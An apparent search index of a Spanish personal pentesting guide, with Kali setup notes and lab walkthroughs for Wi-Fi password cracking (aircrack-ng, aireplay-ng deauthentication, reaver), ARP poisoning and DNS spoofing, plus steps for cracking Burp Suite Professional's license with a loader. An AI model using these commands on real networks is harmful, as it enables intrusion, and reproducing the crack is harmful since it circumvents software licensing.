{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83d\udee1\ufe0f Bienvenido a My Knowledge Base","text":"<p>Esta es una gu\u00eda personal y t\u00e9cnica enfocada en ciberseguridad ofensiva y pentesting, creada para documentar aprendizajes, pr\u00e1cticas, herramientas y configuraciones en entornos Kali Linux y pruebas de APIs.</p>"},{"location":"#contenido-principal","title":"\ud83d\udcda Contenido principal","text":"<p>Explora las secciones disponibles desde el men\u00fa lateral o haz clic en alguno de los siguientes m\u00f3dulos destacados:</p> <ul> <li>\ud83d\udd0d Pentesting en APIs: fundamentos, arquitectura, autenticaci\u00f3n, vulnerabilidades y metodolog\u00edas.</li> <li>\u2699\ufe0f Configuraci\u00f3n de entorno Kali: desde la instalaci\u00f3n, interfaz gr\u00e1fica, hasta personalizaciones \u00fatiles.</li> <li>\ud83e\uddea Laboratorios pr\u00e1cticos: incluye ataques MITM, spoofing, fuzzing, Nmap, Ettercap, Burp Suite, entre otros.</li> <li>\ud83d\udee0\ufe0f Herramientas: uso y ejemplos con Postman, Metasploit, OWASP ZAP, Armitage, y m\u00e1s.</li> <li>\ud83d\udcd6 Comandos esenciales: resumen de comandos clave para usar Kali Linux de forma eficiente.</li> </ul>"},{"location":"#como-usar-esta-guia","title":"\ud83d\ude80 \u00bfC\u00f3mo usar esta gu\u00eda?","text":"<p>Puedes navegar desde el men\u00fa lateral por categor\u00eda o usar el buscador (\u00edcono de lupa arriba a la derecha).</p> <p>Cada secci\u00f3n est\u00e1 pensada para ser independiente, pero se recomienda seguir este orden si est\u00e1s iniciando:</p> <ol> <li>Introducci\u00f3n a Pentesting</li> <li>APIs y Seguridad</li> <li>Configuraci\u00f3n de entorno</li> <li>Laboratorios</li> <li>Herramientas avanzadas</li> </ol>"},{"location":"#autor","title":"\ud83d\udc68\u200d\ud83d\udcbb Autor","text":"<p>Esta gu\u00eda fue creada por SrRusian como parte de un proceso autodidacta para estructurar y compartir aprendizajes en el mundo del hacking \u00e9tico.</p> <p>\ud83e\udde0 \u201cEl conocimiento es poder, pero solo si se comparte.\u201d</p>"},{"location":"configuracion-maquina/extras/","title":"Extras","text":""},{"location":"configuracion-maquina/extras/#comodidad","title":"COMODIDAD","text":""},{"location":"configuracion-maquina/extras/#bluetooth","title":"BLUETOOTH","text":"<ul> <li>Esto har\u00e1 que el servicio bluetooth se inicie siempre que el sistema se encienda sudo systemctl enable bluetooth</li> <li>Agregaremos el comando de inicio al archivo .bashrc nano ~/.bashrc</li> <li>Agregamos la l\u00ednea sudo systemctl start bluetooth</li> </ul>"},{"location":"configuracion-maquina/extras/#templates","title":"TEMPLATES","text":"<p>Al cambiar a un nuevo entorno grafico desde kali a GNOME no tendremos el acceso directo a la creaci\u00f3n r\u00e1pida de documentos con clic derecho, sin embargo podremos usar las Templates que nos ayudaran a copiar un poco esta funcionalidad.</p> <ul> <li>Si no tenemos la carpeta Templates la creamos con mkdir ~/Templates</li> <li>Ahora crearemos un archivo vaci\u00f3 de un ejecutable nano ~/Templates/NuevoEjecutable.sh</li> <li>Agregamos un texto DEFAULT: Este es un script ejecutable</li> <li>Ahora de un Lanzador nano ~/Templates/NuevoLanzador.desktop</li> <li> <p>Para este debemos agregar sus valores DEFAULT: [Desktop Entry] Version=1.0 Type=Application Name=NuevoLanzador Exec=/ruta/al/ejecutable Icon=/ruta/al/icono.png Terminal=false Categories=Utility; </p> </li> <li> <p>Si es necesario les damos permisos de ejecuci\u00f3n chmod +x ~/Templates/NuevoEjecutable.sh     chmod +x ~/Templates/NuevoLanzador.desktop</p> </li> <li>Tambi\u00e9n podemos hacer el mismo procedimiento para un nuevoDocumento.txt</li> </ul>"},{"location":"configuracion-maquina/gui/","title":"GUI","text":"<p>Esto cambiara la interfaz default de kali por algo m\u00e1s dise\u00f1ado y bonito pero sacrificaremos unas pocas cosas de kali que aunque podemos acceder a ellas debemos hacer unas configuraciones seg\u00fan sea necesario despu\u00e9s.</p> <ol> <li>Actualizar el sistema sudo apt update &amp;&amp; sudo apt upgrade -y</li> <li>Instalamos GNOME sudo apt install kali-desktop-gnome -y</li> <li>Reiniciamos el SO sudo reboot</li> <li>Elegir GDM como nuestro nuevo gestor de pantalla justo al final de la instalaci\u00f3n o con el comando sudo dpkg-reconfigure lightdm</li> </ol>"},{"location":"configuracion-maquina/herramientas/","title":"HERRAMIENTAS","text":""},{"location":"configuracion-maquina/herramientas/#burpsuite-professional","title":"BURPSUITE PROFESSIONAL","text":"<ul> <li>Se necesitar\u00e1 instalar JAVA 21 JDK para esta instalaci\u00f3n y elegirlo como \u201cPor defecto\u201d</li> <li>Descargar la \u00faltima versi\u00f3n de BurpSuite Professional</li> <li>Descargar el LOADER la contrase\u00f1a es 1321</li> <li>Ya instalado JAVA debemos tener el LOADER y el Burpsuite Professional JAR en el mismo directorio</li> <li>Ejecutamos en la Terminal (Agregamos el nombre exacto del loader)     java -jar LOADER.jar</li> <li>Se nos muestra esta pantalla </li> <li>En el Loader Command debemos modificar al final el nombre el de nuestra versi\u00f3n de Burpsuite Pro pues este comando ejecutara nuestro archivo Burpsuite Pro descargado</li> <li>Si todo esta correcto al correr el comando en Run deber\u00eda mostrar que se abre burpsuite Pro pidiendo una llave de licencia donde debemos pegar todo el cuadro de texto que nos da el Loader en su cuadro License</li> <li>Damos Next en Burpsuite y Seleccionamos Manual Activation</li> <li>La Request que nos da en el punto 2 la copiamos y la pegamos en la secci\u00f3n Action Request de nuestro Loader</li> <li>Y en cuanto la peguemos nos dar\u00e1 en el Loader el texto de Activation Response que copiaremos y pegaremos en Response de Burpsuite que es el punto 3 y daremos Next</li> <li>Si todo fue correcto tendremos activado Burpsuite Pro y lo podremos usar solo a trav\u00e9s del loader ya sin hacer todos los pasos anteriores.</li> <li>Si se quiere simplificar esto y aplicarlo como si estuviera instalado de forma normal debemos hacer unas configuraciones extras a continuaci\u00f3n.</li> <li>Crearemos una carpeta y dentro pondremos nuestro burpsuite y loader</li> <li>Abriremos una terminal dentro de la carpeta donde est\u00e1n los documentos y ejecutaremos         nano launch_burpsuite.sh</li> <li>Y dentro del documento pegaremos completo el Loader Command que tiene ya el LOADER al darle RUN</li> <li>Deber\u00edamos tener algo como por ejemplo:   </li> <li>Esto abrir\u00e1 una terminal, navegara a la ubicaci\u00f3n donde est\u00e1n nuestros documentos y ejecutara el c\u00f3digo del Loader directo</li> <li>Ahora ya creado le daremos privilegios chmod +x ~/Desktop/launch_burpsuite.sh</li> <li>Ahora crearemos un Lanzador.dektop:         nano ~/.local/share/applications/burpsuite-launcher.desktop</li> <li> <p>Agregaremos y guardaremos: [Desktop Entry] Version=1.0 Name=BurpSuite Pro Launcher Exec=/home/rusian/Desktop/launch_burpsuite.sh Icon=/ruta/completa/hacia/icono.png # Puedes elegir un icono si tienes uno disponible Type=Application Categories=Development;Security; Terminal=false </p> </li> <li> <p>Le damos ahora privilegios chmod +x ~/.local/share/applications/burpsuite-launcher.desktop</p> </li> <li>Actualizamos el cache de las aplicaciones update-desktop-database ~/.local/share/applications</li> <li>Ahora al buscarla en las aplicaciones deber\u00eda aparecer y al ejecutarla deber\u00eda abrirse sin problema alguno </li> <li>Podemos borrar otras versiones de burpsuite si queremos y si movemos la ubicaci\u00f3n de nuestra carpeta debemos modificar tambi\u00e9n las rutas de los 2 documentos sh y desktop. </li> </ul>"},{"location":"configuracion-maquina/particiones/","title":"CONFIGURACIONES EXTRA DE LA MAQUINA (OPCIONALES)","text":"<p>ES RECOMENDABLE EL USAR LA ENCRIPTACION DEL DISCO DURANTE LA IINSTALACION DEL SISTEMA OPERATIVO POR SEGURIDAD (EN MI CASO KALI) PARA EVITARNOS PROBLEMAS FUTUROS. LA MEJOR OPCION SERIA LAS PARTICIONES MANUALES, LAS CUALES DEBERIAMOS TENER/CREAR PARA NO TENER PROBLEMAS EN LA INSTALACION SERIAN:</p> <ul> <li>SWAP (Tama\u00f1o de almacenamiento recomendado igual que la de la ram)</li> <li>ext4 (Tama\u00f1o a gusto pues ser\u00e1 el del SO con la ruta /)</li> <li>ESP (Tama\u00f1o recomendado de 540MB hasta 1GB)</li> <li>ext4 (Tama\u00f1o recomendado de 540MB hasta 1GB con la ruta /boot)</li> </ul> <p>(O SIMPLEMENTE PODEMOS USAR LA OPCION DE ENCRYPTED LVM PARA FACILITAR LA INSTALACION)</p>"},{"location":"configuracion-maquina/terminal/","title":"TERMINAL","text":"<ul> <li> <p>Escalaci\u00f3n de privilegios para disminuir el uso de SUDO: sudo apt install -y kali-grant-root &amp;&amp; sudo dpkg-reconfigure kali-grant-root</p> </li> <li> <p>Codificaci\u00f3n por colores para el usuario root:</p> <ol> <li>Abrir terminal ROOT</li> <li>Ejecutar leafpad ~/.bashrc</li> <li>Eliminamos el contenido del documento</li> <li>Copiamos todo el contenido de GITHUB</li> <li>Lo pegamos en nuestro documento anteriormente abierto</li> <li>Guardamos el documento sobrescrito</li> </ol> </li> </ul>"},{"location":"herramientas/armitage/","title":"EXPLORACION DE LA HERRAMIENTA ARMITAGE","text":"<p>Armitage es una interfaz gr\u00e1fica de usuario (GUI) para Metasploit Framework, una herramienta de pruebas de penetraci\u00f3n ampliamente utilizada en seguridad inform\u00e1tica. Armitage proporciona una forma visual y simplificada de interactuar con Metasploit, lo que facilita la realizaci\u00f3n de pruebas de penetraci\u00f3n y la ejecuci\u00f3n de ataques de manera m\u00e1s intuitiva para usuarios que no est\u00e1n familiarizados con la l\u00ednea de comandos.</p>  [PRACTICA INTERACCION BASICA](../laboratorio/metasploit-lab.md#laboratorio-3-interaccion-con-la-herramienta-armitage)"},{"location":"herramientas/general-cheatsheet/","title":"Comandos Comunes","text":""},{"location":"herramientas/general-cheatsheet/#comandos-basicos","title":"COMANDOS BASICOS","text":"<ul> <li>passwd (Crear nueva contrase\u00f1a)</li> <li>ls (Listar o mostrar documentos en carpeta actual)</li> <li>man (Muestra un manual)</li> <li>pwd (Mostrar directorio actual)</li> <li>cd (Cambiar entre carpetas)</li> <li>mkdir (Crear directorio)</li> <li>rmdir (Remover directorio)</li> <li>cat (Visualizar, unir y crear archivos)</li> <li>nano (Editar archivos)</li> <li>ifconfig (Mostrar informaci\u00f3n de red)</li> <li>updatedb (Crea base de datos sobre archivos en el sistema)</li> <li>locate (Ubicar direcci\u00f3n de documento o carpeta registrada en la BD(updatedb))</li> <li>uname (Mostrar versi\u00f3n kali actual)</li> </ul>"},{"location":"herramientas/metasploit/","title":"Metasploit","text":""},{"location":"herramientas/metasploit/#metasploit-framework-todo-en-uno","title":"METASPLOIT FRAMEWORK TODO EN UNO","text":"<p>Metasploit Framework es una plataforma de c\u00f3digo abierto que proporciona una colecci\u00f3n de herramientas y recursos para llevar a cabo pruebas de penetraci\u00f3n y explotaci\u00f3n de sistemas inform\u00e1ticos.</p> <p>Esta funciona al permitir a los usuarios buscar, desarrollar y ejecutar exploits contra sistemas objetivo para probar su seguridad. Los exploits son programas o scripts dise\u00f1ados para aprovechar vulnerabilidades conocidas en software o sistemas operativos. Metasploit Framework proporciona una interfaz de l\u00ednea de comandos y una interfaz gr\u00e1fica de usuario (llamada msfconsole) que permiten a los usuarios interactuar con la plataforma y realizar acciones como buscar exploits, seleccionar payloads, configurar opciones y ejecutar ataques.</p>"},{"location":"herramientas/metasploit/#arquitectura-de-metasploit-framework","title":"ARQUITECTURA DE METASPLOIT FRAMEWORK","text":"<p>MSF BASE</p> <ul> <li>Plugins: Son componentes adicionales que extienden la funcionalidad de Metasploit Framework, permitiendo agregar nuevas caracter\u00edsticas o integraciones.</li> <li>Interfaces: Son las diferentes formas en que los usuarios pueden interactuar con Metasploit Framework. Esto incluye la interfaz de l\u00ednea de comandos (CLI), la consola de Metasploit (msfconsole), la interfaz gr\u00e1fica de usuario (GUI) y la interfaz web.</li> <li>M\u00f3dulos: Son los componentes principales de Metasploit Framework que se utilizan para realizar acciones espec\u00edficas durante una prueba de penetraci\u00f3n. Los m\u00f3dulos incluyen:</li> <li>Payloads: Fragmentos de c\u00f3digo que se ejecutan despu\u00e9s de que un exploit ha tenido \u00e9xito y proporcionan funcionalidades espec\u00edficas en el sistema comprometido. Los payloads pueden incluir acciones como proporcionar acceso remoto al sistema, ejecutar comandos, recopilar informaci\u00f3n del sistema, entre otros.</li> <li>Exploits: M\u00f3dulos que aprovechan vulnerabilidades conocidas en software o sistemas operativos para comprometer sistemas objetivo. Cada exploit est\u00e1 dise\u00f1ado para explotar una vulnerabilidad espec\u00edfica y puede incluir c\u00f3digo que permite ejecutar comandos arbitrarios en el sistema objetivo.</li> <li>Encoders: M\u00f3dulos utilizados para cifrar o codificar payloads con el fin de evadir la detecci\u00f3n de antivirus o intrusiones. Los encoders pueden convertir un payload en una forma diferente que sea m\u00e1s dif\u00edcil de detectar por los sistemas de seguridad.</li> <li>Nops: Abreviatura de \"no operations\", son m\u00f3dulos utilizados para agregar relleno adicional a los exploits o payloads. Esto puede ser \u00fatil para alinear la memoria o ajustar la longitud del exploit para que funcione correctamente en el sistema objetivo.</li> <li>Auxiliares: Proporcionan funcionalidades adicionales que pueden ser \u00fatiles durante una prueba de penetraci\u00f3n, pero no est\u00e1n directamente relacionadas con la explotaci\u00f3n de vulnerabilidades. Estos m\u00f3dulos pueden incluir herramientas de escaneo de red, explotaci\u00f3n de debilidades de configuraci\u00f3n, enumeraci\u00f3n de servicios, entre otros.</li> </ul> <p>MSF CORE</p> <p>Este es el n\u00facleo de Metasploit Framework que proporciona la funcionalidad esencial para la ejecuci\u00f3n de exploits, payloads y otros m\u00f3dulos. Es responsable de coordinar las acciones de los m\u00f3dulos y proporcionar la infraestructura necesaria para ejecutar pruebas de penetraci\u00f3n de manera efectiva.</p> <p>REX</p> <p>Es un marco de trabajo (framework) dentro de Metasploit que se utiliza para el desarrollo de herramientas y scripts personalizados. Proporciona una serie de herramientas y bibliotecas (librareis) que los usuarios pueden utilizar para automatizar tareas espec\u00edficas durante una prueba de penetraci\u00f3n.</p> <ul> <li>Herramientas: Son las herramientas espec\u00edficas que forman parte del marco Rex y se utilizan para realizar acciones concretas durante una prueba de penetraci\u00f3n.</li> <li>Librer\u00edas: Son las bibliotecas de funciones y utilidades que proporcionan funcionalidades adicionales para el desarrollo de herramientas y scripts personalizados en Metasploit.  </li> </ul>  [PRACTICA INTERACCION BASICA METASPLOIT](../laboratorio/metasploit-lab.md#laboratorio-1-interaccion-basica)"},{"location":"herramientas/metasploitableVM/","title":"METASPLOITABLE VM","text":"<p>Metasploitable es una m\u00e1quina virtual dise\u00f1ada espec\u00edficamente para ser vulnerable a ataques de seguridad con el prop\u00f3sito de ser utilizada como un entorno de pruebas para probar y aprender sobre herramientas y t\u00e9cnicas de seguridad inform\u00e1tica.</p> <p>Fue creada por Rapid7, la empresa detr\u00e1s de Metasploit, una conocida herramienta de pruebas de penetraci\u00f3n. Metasploitable simula un sistema operativo basado en Linux con una variedad de vulnerabilidades conocidas y configuraciones d\u00e9biles preinstaladas.</p> <p>Estas vulnerabilidades pueden incluir fallos de seguridad en el software, configuraciones de red inseguras, contrase\u00f1as d\u00e9biles, entre otros. Los usuarios pueden utilizar Metasploitable de manera segura en un entorno controlado para practicar y aprender sobre pruebas de penetraci\u00f3n, explotaci\u00f3n de vulnerabilidades y defensa de sistemas.</p>  [PRACTICA METASPLOITABLE VM](../laboratorio/metasploitableVM.md)"},{"location":"herramientas/nmap/","title":"NMAP","text":""},{"location":"herramientas/nmap/#introduccion-a-nmap","title":"INTRODUCCION A NMAP","text":"<p>Nmap es una herramienta de c\u00f3digo abierto utilizada para escanear redes y descubrir dispositivos, puertos abiertos y servicios en una red permitiendo evaluar mediante diversas t\u00e9cnicas de escaneo, como escaneo de puertos TCP y UDP, detecci\u00f3n de sistemas operativos y detecci\u00f3n de servicios.</p>"},{"location":"herramientas/nmap/#para-que-sirve","title":"\u00bfPara qu\u00e9 sirve?","text":"<p>Nmap utiliza paquetes de IP sin procesar para determinar:</p> <ul> <li>Hosts disponibles en la red</li> <li>Servicios (nombre y versi\u00f3n de la aplicaci\u00f3n)</li> <li>Sistemas operativos (y versiones)</li> <li>Tipos de filtros de paquetes/cortafuegos en uso</li> <li>Estado de los puertos de hosts</li> </ul>"},{"location":"herramientas/nmap/#sintaxis-basica-general","title":"SINTAXIS BASICA GENERAL","text":"<p>#nmap [tipo de escaneo] [opciones] {objetivos}</p>"},{"location":"herramientas/nmap/#opciones-comunes-de-nmap","title":"OPCIONES COMUNES DE NMAP","text":"OPCION NOMBRE DESCRIPCION -sS Escaneo TCP SYN La forma predeterminada y m\u00e1s r\u00e1pida de escanear miles de puertos. Escaneo semiabierto -sT Escaneo de conexi\u00f3n TCP La llamada al sistema completa las conexiones a los puertos de destino abiertos en lugar de realizar el reinicio a medio abrir que hace el escaneo SYN. -sU Escaneo UDP El escaneo UDP funciona enviando un paquete UDP a cada puerto objetivo. -sN Escaneo nulo TCP Esta opci\u00f3n env\u00eda paquetes TCP sin ninguna de las banderas TCP establecidas en el paquete. Si el escaneo devuelve un paquete RST significa que el puerto est\u00e1 cerrado, sin embargo, si no devuelve nada est\u00e1 filtrado o abierto. -sn Ping/Sweep Solo env\u00eda paquetes ping al objetivo, sin escaneo de puertos. Esto es \u00fatil si necesita determinar que hosts est\u00e1n en las inmediaciones, pero no quiere escanear todav\u00eda. -v Aumentar verbosidad Esto le dar\u00e1 informaci\u00f3n extra en los datos emitidos por nmap. -T4 Plantilla de tiempos 0:paranoico, 1:escurridizo, 2:educado, 3:normal, 4:agresivo, 5:demente -sV Enumerar Sondear activamente los puertos abiertos para intentar determinar qu\u00e9 servicio y versi\u00f3n est\u00e1n ejecutando. -P Puerto Lista separada por comas de los puertos a escanear. -oG Salida Grepable Redirigir la salida a un archivo de texto. -F Modo r\u00e1pido En lugar de escanear tantos puertos como hace el escaneo por defecto, el escaneo r\u00e1pido solo escanea unos pocos. -O Comprobar Sistema operativo Nmap intenta determinar el tipo de sistema operativo. -A Comprobar Sistema Operativo + Detectar sistemas operativos y servicios. -Pn Omitir descubrimiento Asumir que el host esta activo, salt\u00e1ndose as\u00ed la fase de descubrimiento del host. -script Utilizar script Este par\u00e1metro recibe una lista separada por comas de archivos, categor\u00edas y directorios que contiene script de NSE.  [PRACTICA DE NMAP](../laboratorio/nmap-lab.md#laboratorio-2-escaneo-local-de-puertos-con-filtros)"},{"location":"herramientas/wpscan/","title":"WPScan","text":"<p>WPScan es una herramienta de seguridad de c\u00f3digo abierto dise\u00f1ada para escaneo y auditor\u00eda de vulnerabilidades en sitios web que usan WordPress. Desarrollada principalmente para administradores de sistemas y profesionales de la seguridad, WPScan permite identificar problemas de seguridad comunes, como:</p> <ul> <li>Plugins y temas vulnerables.</li> <li>Usuarios d\u00e9biles o expuestos.</li> <li>Configuraciones incorrectas.</li> <li>Versiones de WordPress obsoletas.</li> </ul> <p>Funciona a trav\u00e9s de una base de datos actualizada de vulnerabilidades espec\u00edficas de WordPress y es muy \u00fatil para detectar y corregir posibles brechas de seguridad en sitios web antes de que puedan ser explotadas.</p>  [PRACTICA HACKEAR SITIO DE WORDPRESS](../laboratorio/wpscan-lab.md)"},{"location":"laboratorio/ataques-redes-inalambricas-lab/","title":"Ataque a Redes Inalambricas","text":""},{"location":"laboratorio/ataques-redes-inalambricas-lab/#laboratorio-1-fern-wifi-cracker","title":"LABORATORIO 1 (FERN WIFI CRACKER)","text":"<ol> <li>Abrimos Fern WIFI Cracker en Kali</li> <li>Seleccionamos la interfaz WLAN0 o tarjeta inal\u00e1mbrica de la maquina</li> <li>Escaneamos los puntos de acceso</li> <li>Abrimos las redes WEP detectadas</li> <li>Se selecciona la red y en Attack</li> <li>Finalmente obtendremos la contrase\u00f1a en la parte inferior</li> </ol>"},{"location":"laboratorio/ataques-redes-inalambricas-lab/#laboratorio-2-fuerza-bruta","title":"LABORATORIO 2 (FUERZA BRUTA)","text":"<ol> <li>En la terminal Kali ejecutamos airmon-ng para ver nuestra interfaz de tarjeta</li> <li>Ahora pondremos nuestra tarjeta en modo monitoreo: airmon-ng start &lt;Interface&gt;</li> <li>Es probable que nos d\u00e9 un error debido a m\u00e1s procesos que interfieren por lo que tendremos que terminarlos con kill &lt;PID&gt; (ID DEL PROCESO)</li> <li>Comenzaremos el monitoreo: airodump-ng wlan0mon (nuestra interfaz)</li> <li>Ahora monitorearemos la red especifica: airodump-ng -w &lt;nombre Archivo&gt; -c &lt;CH de la red&gt; --bssid &lt;BSSID de la red&gt; wlan0mon airodump-ng -w attack1 -c 3 --bssid 5C:E9:31:01:36:DF wlan0mon</li> <li>Ahora ocupamos un Handshake de la red por lo que en otra terminal ejecutaremos: aireplay-ng -0 &lt;paquetesAEnviar&gt; -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0mon aireplay-ng -0 10 -a 5C:E9:31:01:36:DF -c D8:1F:12:B4:41:A9 wlan0mon</li> <li>Y ahora en la anterior terminal deber\u00edamos tener el HANDSHAKE en la parte superior derecha. EJEMPLO: </li> <li>Y ahora podemos detener este monitoreo y cerrar la otra terminal</li> <li>Y ahora intentaremos entrar en la red: aircrack-ng -w &lt;ubicacionListaPalabras&gt; -b &lt;SSID&gt; &lt;archivoCapCreadoDelMonitoreoAnterior&gt; aircrack-ng -w /Desktop/wordlist.txt -b 5C:E9:31:01:36:DF /home/rusian/attack1.cap</li> <li>Comenzar\u00e1 a probar todas las combinaciones de la lista de palabras (wordlist.txt) para encontrar la correcta de la red.</li> </ol> <p>EXTRA</p> <p>Las redes WPA2 son muy fuertes y no se pueden violar simplemente por ensayo y error como en la WEP por lo que es necesario tener una lista de palabras y dependiendo si esta lista es fuerte podr\u00e1 ser posible descifrar mejor esta red mientras que si es d\u00e9bil esta lista no ser\u00e1 posible por lo que en este caso usamos un ataque de fuerza bruta el cual eval\u00faa todas las palabras de la lista que consegu\u00ed para descifrar la contrase\u00f1a.</p> <p>El archivo CAP por defecto deber\u00eda guardarse en nuestra carpeta Home y se crea con el nombre que nosotros antes le asignamos, y aunque al hacer el monitoreo se crean m\u00e1s tipos de archivos con el mismo nombre solo ser\u00e1 necesario utilizar en este caso el (.cap)</p> <p>Este m\u00e9todo para estas redes suele ser tardado y no muy fiable de \u00e9xito</p>"},{"location":"laboratorio/ataques-redes-inalambricas-lab/#laboratorio-3-wps-crack","title":"LABORATORIO 3 (WPS CRACK)","text":"<ol> <li>Con el comando wash y reaver en la terminal se nos mostraran varias opciones a usar</li> <li>Abrimos el modo monitoreo de nuestra tarjeta de red: wash -i wlan0mon</li> <li>Y para comenzar simplemente ejecutamos: reaver -i wlan0mon -b &lt;BSSID&gt; -vv</li> <li>Y al final podremos obtener el pin WPS</li> </ol> <p>Este m\u00e9todo puede durar bastante, ya sea un par de horas o incluso d\u00edas, pero se nos podr\u00e1 mostrar el pin WPS y la contrase\u00f1a WPA2 para podernos conectar a la red, pero si el usuario cambio la contrase\u00f1a de la red solo debemos cambiar la opci\u00f3n -vv por -p &lt;pinDe8Digitos&gt; el cual ya obtuvimos antes con el escaneo anterior y obtendremos la contrase\u00f1a WPA2 de nuevo en cuesti\u00f3n de segundos.</p> <p>reaver -i wlan0mon -b &lt;BSSID&gt; -p &lt;pin&gt;</p>"},{"location":"laboratorio/ataques-redes-inalambricas-lab/#configuraciones-finales-extra","title":"CONFIGURACIONES FINALES EXTRA","text":"<p>Para regresar nuestra tarjeta de red al modo normal hay dos formas:</p> <ul> <li>Reiniciando la maquina</li> <li>Reiniciando los servicios por Terminal<ul> <li>airmon-ng stop wlan0mon</li> <li>ifconfig wlan0 up</li> <li>service NetworkManager restart</li> </ul> </li> </ul>"},{"location":"laboratorio/burpsuite-lab/","title":"Burpsuite","text":""},{"location":"laboratorio/burpsuite-lab/#laboratorio-1-interceptar-trafico-web","title":"LABORATORIO 1 (INTERCEPTAR TRAFICO WEB)","text":"<ul> <li>Ejecutaremos nuestra m\u00e1quina virtual Metasploitable</li> <li>Abrir burpsuite en la secci\u00f3n Proxy&gt;Proxy Settings veremos la ip en la cual esta burpsuite escuchando </li> <li>Ahora en nuestro navegador nos iremos a ajustes y buscamos proxy, nos metemos en sus ajustes y en Proxy Manual agregamos la ip y el puerto donde estaba burpsuite para redirigir el tr\u00e1fico de datos(Esto solo funcionara para sitios HTTP; Para sitios HTTPS es necesario en el proxy del navegador agregar de igual forma la ip y puerto, y tambi\u00e9n tendremos que exportar los certificados de burpsuite e importarlos en el navegador para poder acceder de forma correcta a las peticiones)</li> <li>En nuestra maquina Metasploitable escribimos (ip a) para saber la ip y acceder a ella desde nuestro navegador</li> <li>Dentro de la p\u00e1gina probaremos el Login de DVWA</li> <li>De regreso en burpsuite en la secci\u00f3n \"Target\" veremos un resumen de las rutas a las cuales hemos consultado dentro de cada direcci\u00f3n ip</li> <li>Con clic derecho sobre la ip de nuestra m\u00e1quina virtual podemos rastrear el host (Add To Scope) </li> <li>En la siguiente opci\u00f3n de modificar el alcance seleccionaremos \"Yes\"</li> <li>Luego en la secci\u00f3n \"Scope\" modificaremos el alcance, en este caso solo tenemos la ip de la m\u00e1quina virtual Metasploitable</li> </ul>"},{"location":"laboratorio/ettercap-lab/","title":"EtterCap","text":""},{"location":"laboratorio/ettercap-lab/#laboratorio-1-man-in-the-middle","title":"LABORATORIO 1 (MAN IN THE MIDDLE)","text":"<ol> <li>En la maquina Windows ejecutaremos ipconfig para obtener la Default Gateway </li> <li>Y posteriormente ejecutamos arp -a para obtener la Physical Addres/MAC de esta misma ip antes deseada </li> <li>En Kali abrimos una terminal y ejecutamos ifconfig para obtener nuestra MAC la cual est\u00e1 marcada como ether cc:47:40:67:34:07</li> <li>Abrimos en Kali la aplicaci\u00f3n ettercap y en Aceptar/Iniciar arriba a la derecha para ejecutarla</li> <li>Escaneamos los hosts en la opci\u00f3n superior izquierda (SCAN FOR HOSTS)</li> <li>Abrimos la lista de anfitriones en la opci\u00f3n superior izquierda (HOSTS LIST)</li> <li>Vemos nuestra maquina objetivo Windows en la lista con la ip 192.168.0.90</li> <li>La seleccionamos, clic derecho y Add Target 1</li> <li>Nos vamos al men\u00fa MITM arriba a la derecha (MITM MENU) y seleccionamos ARP POISONING</li> <li>Marcamos solo para esta pr\u00e1ctica la opci\u00f3n ONLY POISON ONE-WAY y OK</li> <li>Verificamos el falso ARP enviado a la maquina objetivo Windows y en la CMD ejecutamos de nuevo arp -a</li> <li>Veremos como ahora la mayor\u00eda de las direcciones f\u00edsicas est\u00e1n sustituidas por la MAC de nuestra maquina atacante Kali, pero la importante es la puerta de enlace 192.168.0.1 </li> <li>Comprobado esto nos iremos a Wireshark en nuestra maquina Kali y comenzamos a capturar paquetes</li> <li>Nos vamos a la maquina Windows v\u00edctima, abrimos el navegador y simplemente nos vamos a www.google.com</li> <li>En Wireshark aplicamos el filtro ip.src==&lt;ip objetivo&gt; </li> <li>Y de esta forma podremos ver las Query o paquetes enviados desde la maquina victima Windows.</li> </ol>"},{"location":"laboratorio/ettercap-lab/#laboratorio-2-dns-spoofing","title":"LABORATORIO 2 (DNS SPOOFING)","text":"<ol> <li>En la terminal de Kali ejecutaremos cd /var/www/html/ y listamos con ls</li> <li> <p>Copiaremos el documento html original ah\u00ed mismo con otro nombre ejecutando: cp index.html index_old.html</p> </li> <li> <p>Abrimos el archive index.html con: leafpad index.html</p> </li> <li>Borramos el contenido completo y haremos una p\u00e1gina html muy sencilla para esta prueba y la guardamos </li> <li>Para que esto funcione debemos hacer unas modificaciones antes a los 2 archivos de ettercap pues ser\u00e1 esta la aplicaci\u00f3n a usar en esta prueba, los dos archivos son etter.conf y etter.dns, para esto los tenemos que localizar con locate etter.conf (si no te aparece nada recuerda ejecutar updatedb para actualizar la base de datos de los documentos en la m\u00e1quina, pues aqu\u00ed se guardan las ubicaciones de todos los documentos de esta)</li> <li> <p>Ya mostrada la ubicaci\u00f3n del documento lo abriremos: leafpad /etc/ettercap/etter.conf</p> </li> <li> <p>Estos 2 valores debemos marcarlos en 0 y guardar (uid y gid) </p> </li> <li> <p>Ahora localizamos el archivo etter.dns y lo abrimos con leafpad, igual que el anterior.</p> </li> <li> <p>Y en la \u00faltima l\u00ednea del documento para esta pr\u00e1ctica agregaremos lo siguiente y lo guardaremos: (En esta pr\u00e1ctica solamente la l\u00ednea: www.google.com A (IP Maquina Kali)) </p> </li> <li> <p>Levantamos el servidor apache para que se puedan conectar a nuestra ip y muestre nuestro documento index.html antes modificado: service apache2 start</p> </li> <li> <p>Si nos vamos a nuestro navegador web en Kali y ponemos la Ip de nuestra misma maquina Kali deber\u00edamos de ver la p\u00e1gina simple que acabamos de crear.</p> </li> <li>Ya todo configurado antes y funcionando nuestro servidor local abriremos Ettercap, iniciaremos, escanearemos los hosts, mostraremos los hosts, seleccionaremos la ip de la maquina objetivo Windows y la agregaremos a Target 1</li> <li>Nos iremos al men\u00fa de MITM, ARP Poisoning, marcamos la opci\u00f3n Sniff Remote Connections y Ok</li> <li>Nos iremos a las opciones de ettercap arriba a la derecha (Ettercap Menu) y seleccionaremos plugins y Manage Plugins</li> <li>Daremos doble clic en dns_spoof y ya se ejecutar\u00e1 nuestro spoofing a la maquina objetivo</li> <li>Ahora en nuestra maquina objetivo Windows abriremos el navegador y de preferencia abrir una ventana en incognito o privada para que al buscar no tengamos cache de nuestras consultas anteriores de DNS porque nos dar\u00e1 problemas.</li> <li>Y vamos a ingresar el DNS exacto que antes agregamos como objetivo para el Spoof que es www.google.com exactamente tal cual lo pusimos en el archivo etter.dns</li> <li>Y podremos ver que hemos sido cambiados a la p\u00e1gina que nosotros hicimos, pero manteniendo en la barra de b\u00fasqueda el DNS google.com</li> </ol> <p>EXTRAS</p> <ul> <li>El uso de la letra A se utiliza para redireccionar un nombre de 